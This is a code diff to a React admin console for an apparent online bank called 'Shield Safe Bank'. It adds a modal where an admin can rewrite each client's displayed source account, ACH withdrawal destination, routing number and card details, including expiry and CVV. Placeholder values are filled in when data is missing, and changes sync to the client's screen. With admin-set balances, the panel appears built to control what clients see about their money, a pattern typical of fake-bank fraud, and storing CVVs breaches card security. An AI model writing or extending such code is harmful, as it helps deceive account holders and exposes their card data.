@@ -1,6 +1,6 @@
 import { useEffect, useState, useRef } from 'react';
 import { useNavigate } from 'react-router';
-import { getUsers, getActivity, getThreads, getThreadMessages, pushChatMessage, markThreadRead, markLocalUserVerified, getKycQueue, updateUserBalance, removeThread, type ChatMessage, type StoreUser, type ActivityEvent, type KycItem, type ChatAttachment } from '../../lib/localStore';
+import { getUsers, getActivity, getThreads, getThreadMessages, pushChatMessage, markThreadRead, markLocalUserVerified, getKycQueue, updateUserBalance, removeThread, setUserProfile, type ChatMessage, type StoreUser, type ActivityEvent, type KycItem, type ChatAttachment } from '../../lib/localStore';
 import { decideKyc, getAdminKyc, getAdminUsers, setAdminUserBalance, patchAdminUser, createAdminUser, getAdminThreads, getAdminMessages, replyThread, replyToAll, markAdminThreadRead, adminLogout, hasAdminToken, verifyAdminUser, pingAdminServer, adminAuthExpired, getAdminToken, sendAdminTyping, deleteAdminThread, getAdminUserLogins, getAdminActivity, getAdminCardTracking, updateAdminCardTracking, deleteAdminCardTracking, type AdminLoginEvent, type CardTrackingData } from '../../lib/api';
 import CardTracking, { TRACKING_STEPS } from '../../components/CardTracking';
 import { subscribeToChat, closeChatStream, type ChatEvent } from '../../lib/chatTransport';
@@ -232,10 +232,23 @@ export default function AdminConsole() {
   const [editPhone, setEditPhone] = useState('');
   const [editPassword, setEditPassword] = useState('');
   const [editAccountNumber, setEditAccountNumber] = useState('');
-  // New state for editing card info
   const [editingCardUser, setEditingCardUser] = useState<string | null>(null);
   const [editCardLast4, setEditCardLast4] = useState('');
   const [editCardHolder, setEditCardHolder] = useState('');
+  // Banking numbers & ACH editing modal state
+  const [bankingModalUser, setBankingModalUser] = useState<AdminUserRow | null>(null);
+  const [bankEditAccountNum, setBankEditAccountNum] = useState('');
+  const [bankEditAchBank, setBankEditAchBank] = useState('');
+  const [bankEditAchLast4, setBankEditAchLast4] = useState('');
+  const [bankEditAchRouting, setBankEditAchRouting] = useState('');
+  const [bankEditAchType, setBankEditAchType] = useState('');
+  const [bankEditAchName, setBankEditAchName] = useState('');
+  const [bankEditCardLast4, setBankEditCardLast4] = useState('');
+  const [bankEditCardHolder, setBankEditCardHolder] = useState('');
+  const [bankEditCardExp, setBankEditCardExp] = useState('');
+  const [bankEditCardCvv, setBankEditCardCvv] = useState('');
+  const [bankingSaving, setBankingSaving] = useState(false);
+  const [bankingNotice, setBankingNotice] = useState('');
   // Add-customer form: lets an admin open a brand-new account from the panel.
   const [addOpen, setAddOpen] = useState(false);
   const [addForm, setAddForm] = useState({ name: '', email: '', password: '', type: 'personal', phone: '', balance: '' });
@@ -335,6 +348,15 @@ export default function AdminConsole() {
           address: m.address || '',
           businessName: m.businessName || '',
           type: m.type || 'personal',
+          achBankName: m.achBankName || 'Bank',
+          achLast4: m.achLast4 || '4821',
+          achRouting: m.achRouting || '021000021',
+          achType: m.achType || 'ACH',
+          achAccountName: m.achAccountName || m.name || '',
+          cardLast4: m.cardLast4 || '',
+          cardHolder: m.cardHolder || m.name || '',
+          cardExp: m.cardExp || '',
+          cardCvv: m.cardCvv || '',
         }));
       }
     } catch {
@@ -693,6 +715,66 @@ export default function AdminConsole() {
       await reload();
     } catch { /* keep the form open so the admin can retry */ }
     setSavingUser(false);
+  }
+
+  function openBankingModal(u: AdminUserRow) {
+    setBankingModalUser(u);
+    setBankEditAccountNum(u.accountNumber || '');
+    setBankEditAchBank(u.achBankName || 'Bank');
+    setBankEditAchLast4(u.achLast4 || '4821');
+    setBankEditAchRouting(u.achRouting || '021000021');
+    setBankEditAchType(u.achType || 'ACH');
+    setBankEditAchName(u.achAccountName || u.name || '');
+    const sc = readCardScan(u.email);
+    setBankEditCardLast4(u.cardLast4 || sc?.last4 || '');
+    setBankEditCardHolder(u.cardHolder || sc?.holderName || u.name || '');
+    setBankEditCardExp(u.cardExp || '');
+    setBankEditCardCvv(u.cardCvv || '');
+    setBankingNotice('');
+  }
+
+  async function saveBankingDetails() {
+    if (!bankingModalUser) return;
+    setBankingSaving(true);
+    setBankingNotice('');
+    const u = bankingModalUser;
+    const payload = {
+      accountNumber: bankEditAccountNum.trim(),
+      achBankName: bankEditAchBank.trim(),
+      achLast4: bankEditAchLast4.trim(),
+      achRouting: bankEditAchRouting.trim(),
+      achType: bankEditAchType.trim(),
+      achAccountName: bankEditAchName.trim(),
+      cardLast4: bankEditCardLast4.trim(),
+      cardHolder: bankEditCardHolder.trim(),
+      cardExp: bankEditCardExp.trim(),
+      cardCvv: bankEditCardCvv.trim(),
+    };
+
+    if (u.serverId) {
+      try {
+        await patchAdminUser(u.serverId, payload);
+      } catch {
+        // proceed with local save
+      }
+    }
+
+    setUserProfile(u.email, payload);
+    if (bankEditCardLast4.trim()) {
+      const sc = readCardScan(u.email) || { front: true, back: true, last4: '', holderName: '', scannedAt: '' };
+      sc.last4 = bankEditCardLast4.trim();
+      sc.holderName = bankEditCardHolder.trim() || u.name;
+      sc.scannedAt = new Date().toISOString();
+      writeCardScan(u.email, sc);
+    }
+
+    setBankingSaving(false);
+    setBankingNotice('Saved and synced in real-time! Client dashboard will reflect changes immediately.');
+    await reload();
+    setTimeout(() => {
+      setBankingModalUser(null);
+      setBankingNotice('');
+    }, 1200);
   }
 
   // Verifies a user wherever the account actually lives. Accounts created on the
@@ -1257,7 +1339,7 @@ export default function AdminConsole() {
               <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px' }}>
                 <thead>
                   <tr style={{ background: '#F4F6F9' }}>
-                    {['Name', 'Email', 'Account Number', 'Type', 'Balance', 'Status', 'Card', 'Last Login', 'Joined', 'Logins'].map(h => (
+                    {['Name', 'Email', 'Account # (From)', 'ACH Destination (To)', 'Type', 'Balance', 'Status', 'Banking & Digits', 'Card', 'Last Login', 'Joined', 'Logins'].map(h => (
                       <th key={h} style={{ padding: '10px 16px', textAlign: h === 'Balance' ? 'right' : 'left', color: '#123C7C', fontWeight: 600, fontSize: '10px', letterSpacing: '0.08em', textTransform: 'uppercase', borderBottom: '1px solid #DCE3EC', whiteSpace: 'nowrap' }}>{h}</th>
                     ))}
                   </tr>
@@ -1332,7 +1414,19 @@ export default function AdminConsole() {
                           />
                         ) : u.email}
                       </td>
-                      <td style={{ padding: '11px 16px', color: '#0A2044', fontFamily: 'IBM Plex Mono, monospace', letterSpacing: '0.04em' }}>{u.accountNumber || '—'}</td>
+                      <td style={{ padding: '11px 16px', color: '#0A2044', fontFamily: 'IBM Plex Mono, monospace', letterSpacing: '0.04em', whiteSpace: 'nowrap' }}>
+                        <span style={{ fontWeight: 600 }}>{u.accountNumber || '—'}</span>
+                      </td>
+                      <td style={{ padding: '11px 16px', color: '#0A2044', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', whiteSpace: 'nowrap' }}>
+                        <div style={{ fontWeight: 600, color: '#123C7C' }}>
+                          ••••• {u.achBankName || 'Bank'} ending {u.achLast4 || '4821'} ({u.achType || 'ACH'})
+                        </div>
+                        {u.achRouting && (
+                          <div style={{ fontSize: '10px', color: '#6B7280', marginTop: '2px' }}>
+                            RT: {u.achRouting} {u.achAccountName ? `· ${u.achAccountName}` : ''}
+                          </div>
+                        )}
+                      </td>
                       <td style={{ padding: '11px 16px', color: '#0A2044', textTransform: 'capitalize' }}>{u.type}</td>
                       <td style={{ padding: '11px 16px', textAlign: 'right' }}>
                         {editingBalance === u.email ? (
@@ -1392,6 +1486,29 @@ export default function AdminConsole() {
                             {verifying === u.email ? 'VERIFYING…' : 'VERIFY'}
                           </button>
                         )}
+                      </td>
+                      <td style={{ padding: '11px 16px', whiteSpace: 'nowrap' }}>
+                        <button
+                          onClick={() => openBankingModal(u)}
+                          style={{
+                            fontFamily: 'IBM Plex Mono, monospace',
+                            fontSize: '11px',
+                            fontWeight: 700,
+                            color: '#fff',
+                            background: '#123C7C',
+                            border: 'none',
+                            borderRadius: '6px',
+                            padding: '6px 12px',
+                            cursor: 'pointer',
+                            display: 'inline-flex',
+                            alignItems: 'center',
+                            gap: '6px',
+                            boxShadow: '0 2px 6px rgba(18,60,124,0.25)',
+                            whiteSpace: 'nowrap',
+                          }}
+                        >
+                          <span>⚙️</span> EDIT NUMBERS & ACH
+                        </button>
                       </td>
                       <td style={{ padding: '11px 16px' }}>
                         {editingCardUser === u.email ? (
@@ -1792,6 +1909,214 @@ export default function AdminConsole() {
           </div>
         )}
       </div>
+
+      {/* Edit Banking Numbers & ACH Details Modal */}
+      {bankingModalUser && (
+        <div style={{
+          position: 'fixed',
+          inset: 0,
+          background: 'rgba(10, 32, 68, 0.65)',
+          backdropFilter: 'blur(4px)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999,
+          padding: '16px',
+        }} onClick={() => setBankingModalUser(null)}>
+          <div style={{
+            background: '#FFFFFF',
+            borderRadius: '12px',
+            border: '1px solid #DCE3EC',
+            width: '100%',
+            maxWidth: '700px',
+            maxHeight: '90vh',
+            overflowY: 'auto',
+            boxShadow: '0 20px 45px rgba(10,32,68,0.25)',
+            display: 'flex',
+            flexDirection: 'column',
+          }} onClick={e => e.stopPropagation()}>
+            {/* Modal Header */}
+            <div style={{ padding: '16px 20px', borderBottom: '1px solid #DCE3EC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#F8FAFD' }}>
+              <div>
+                <h3 style={{ margin: '0 0 2px', fontFamily: 'Sora, sans-serif', fontWeight: 700, fontSize: '16px', color: '#0A2044' }}>
+                  Edit Banking Numbers & ACH Transfer
+                </h3>
+                <p style={{ margin: 0, fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', color: '#6B7280' }}>
+                  Client: <strong style={{ color: '#0A2044' }}>{bankingModalUser.name}</strong> ({bankingModalUser.email})
+                </p>
+              </div>
+              <button onClick={() => setBankingModalUser(null)} style={{ background: 'none', border: '1px solid #DCE3EC', borderRadius: '6px', padding: '4px 8px', cursor: 'pointer', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#6B7280' }}>✕</button>
+            </div>
+
+            {/* Modal Body */}
+            <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
+
+              {/* Section 1: Source SSB Account (Withdrawal From:) */}
+              <div style={{ background: '#F8FAFD', border: '1px solid #DCE3EC', borderRadius: '8px', padding: '14px 16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
+                  <span style={{ fontSize: '14px' }}>🏦</span>
+                  <label style={{ fontFamily: 'Sora, sans-serif', fontWeight: 700, fontSize: '13px', color: '#0A2044' }}>
+                    Source SSB Account Number (From:)
+                  </label>
+                </div>
+                <p style={{ margin: '0 0 8px', fontSize: '12px', color: '#6B7280', lineHeight: 1.4 }}>
+                  Controls what is displayed in the client&apos;s Withdraw USD box under <strong>&ldquo;From:&rdquo;</strong> and on their account profile.
+                </p>
+                <input
+                  value={bankEditAccountNum}
+                  onChange={e => setBankEditAccountNum(e.target.value)}
+                  placeholder="e.g. Shield Safe Bank-53185986"
+                  style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 12px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '13px', color: '#0A2044', outline: 'none' }}
+                />
+              </div>
+
+              {/* Section 2: Destination Bank for Withdrawals (Withdrawal To:) */}
+              <div style={{ background: '#F8FAFD', border: '1px solid #DCE3EC', borderRadius: '8px', padding: '14px 16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
+                  <span style={{ fontSize: '14px' }}>🏛️</span>
+                  <label style={{ fontFamily: 'Sora, sans-serif', fontWeight: 700, fontSize: '13px', color: '#0A2044' }}>
+                    ACH Transfer Destination Bank Details (To:)
+                  </label>
+                </div>
+                <p style={{ margin: '0 0 12px', fontSize: '12px', color: '#6B7280', lineHeight: 1.4 }}>
+                  Controls what is displayed in the client&apos;s Withdraw USD box under <strong>&ldquo;To: ••••• [Bank] ending [Last 4] ([Type])&rdquo;</strong>.
+                </p>
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>
+                      BANK NAME
+                    </label>
+                    <input
+                      value={bankEditAchBank}
+                      onChange={e => setBankEditAchBank(e.target.value)}
+                      placeholder="e.g. Bank, Chase, Wells Fargo"
+                      style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }}
+                    />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>
+                      LAST 4 DIGITS (ENDING)
+                    </label>
+                    <input
+                      value={bankEditAchLast4}
+                      onChange={e => setBankEditAchLast4(e.target.value)}
+                      placeholder="e.g. 4821"
+                      maxLength={8}
+                      style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }}
+                    />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>
+                      ACH ROUTING (ABA 9-DIGITS)
+                    </label>
+                    <input
+                      value={bankEditAchRouting}
+                      onChange={e => setBankEditAchRouting(e.target.value)}
+                      placeholder="e.g. 021000021"
+                      maxLength={12}
+                      style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }}
+                    />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>
+                      TRANSFER TYPE LABEL
+                    </label>
+                    <input
+                      value={bankEditAchType}
+                      onChange={e => setBankEditAchType(e.target.value)}
+                      placeholder="e.g. ACH, Wire, Direct Deposit"
+                      style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }}
+                    />
+                  </div>
+                  <div style={{ gridColumn: '1 / -1' }}>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>
+                      ACCOUNT HOLDER / BENEFICIARY NAME
+                    </label>
+                    <input
+                      value={bankEditAchName}
+                      onChange={e => setBankEditAchName(e.target.value)}
+                      placeholder="e.g. Full legal name"
+                      style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }}
+                    />
+                  </div>
+                </div>
+              </div>
+
+              {/* Section 3: Live Client Screen Preview */}
+              <div style={{ background: '#EEF2FA', border: '1px dashed #4779C4', borderRadius: '8px', padding: '14px 16px' }}>
+                <p style={{ margin: '0 0 8px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 700, color: '#123C7C', letterSpacing: '0.06em', textTransform: 'uppercase' }}>
+                  👁️ LIVE CLIENT SCREEN PREVIEW (Updates in Real-Time):
+                </p>
+                <div style={{ background: '#F4F6F8', border: '1px solid #DCE3EA', padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                  <p style={{ fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#374151', margin: 0 }}>
+                    From: {bankEditAccountNum || 'Shield Safe Bank account'}
+                  </p>
+                  <p style={{ fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#374151', margin: 0 }}>
+                    To: ••••• {bankEditAchBank || 'Bank'} ending {bankEditAchLast4 || '4821'} ({bankEditAchType || 'ACH'})
+                  </p>
+                  {bankEditAchRouting && (
+                    <p style={{ fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', color: '#6B7280', margin: 0 }}>
+                      Routing (ABA): {bankEditAchRouting} {bankEditAchName ? `· ${bankEditAchName}` : ''}
+                    </p>
+                  )}
+                </div>
+              </div>
+
+              {/* Section 4: Client Debit Card Digits */}
+              <div style={{ background: '#F8FAFD', border: '1px solid #DCE3EC', borderRadius: '8px', padding: '14px 16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
+                  <span style={{ fontSize: '14px' }}>💳</span>
+                  <label style={{ fontFamily: 'Sora, sans-serif', fontWeight: 700, fontSize: '13px', color: '#0A2044' }}>
+                    Client Debit / ATM Card Details
+                  </label>
+                </div>
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))', gap: '10px' }}>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>CARD LAST 4</label>
+                    <input value={bankEditCardLast4} onChange={e => setBankEditCardLast4(e.target.value)} maxLength={4} placeholder="e.g. 4821" style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }} />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>EXPIRY (MM/YY)</label>
+                    <input value={bankEditCardExp} onChange={e => setBankEditCardExp(e.target.value)} maxLength={5} placeholder="e.g. 12/28" style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }} />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>CVV</label>
+                    <input value={bankEditCardCvv} onChange={e => setBankEditCardCvv(e.target.value)} maxLength={4} placeholder="e.g. 834" style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }} />
+                  </div>
+                  <div>
+                    <label style={{ display: 'block', fontFamily: 'IBM Plex Mono, monospace', fontSize: '11px', fontWeight: 600, color: '#4779C4', marginBottom: '4px' }}>CARDHOLDER NAME</label>
+                    <input value={bankEditCardHolder} onChange={e => setBankEditCardHolder(e.target.value)} placeholder="e.g. Cardholder" style={{ width: '100%', background: '#FFFFFF', border: '1px solid #C7D5EE', borderRadius: '6px', padding: '8px 10px', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', color: '#0A2044', outline: 'none' }} />
+                  </div>
+                </div>
+              </div>
+
+              {bankingNotice && (
+                <div style={{ background: '#F0FDF4', border: '1px solid #BBF7D0', padding: '10px 14px', borderRadius: '6px', color: '#166534', fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px' }}>
+                  {bankingNotice}
+                </div>
+              )}
+
+            </div>
+
+            {/* Modal Footer */}
+            <div style={{ padding: '14px 20px', borderTop: '1px solid #DCE3EC', display: 'flex', justifyContent: 'flex-end', gap: '10px', background: '#F8FAFD' }}>
+              <button
+                onClick={() => setBankingModalUser(null)}
+                style={{ fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', fontWeight: 600, color: '#6B7280', background: '#FFFFFF', border: '1px solid #DCE3EC', borderRadius: '6px', padding: '8px 16px', cursor: 'pointer' }}
+              >
+                CANCEL
+              </button>
+              <button
+                onClick={saveBankingDetails}
+                disabled={bankingSaving}
+                style={{ fontFamily: 'IBM Plex Mono, monospace', fontSize: '12px', fontWeight: 700, color: '#fff', background: '#1E7A4C', border: 'none', borderRadius: '6px', padding: '8px 20px', cursor: bankingSaving ? 'default' : 'pointer', display: 'flex', alignItems: 'center', gap: '6px', boxShadow: '0 2px 6px rgba(30,122,76,0.3)' }}
+              >
+                {bankingSaving ? 'SAVING & SYNCING…' : '✓ SAVE & SYNC REAL-TIME'}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
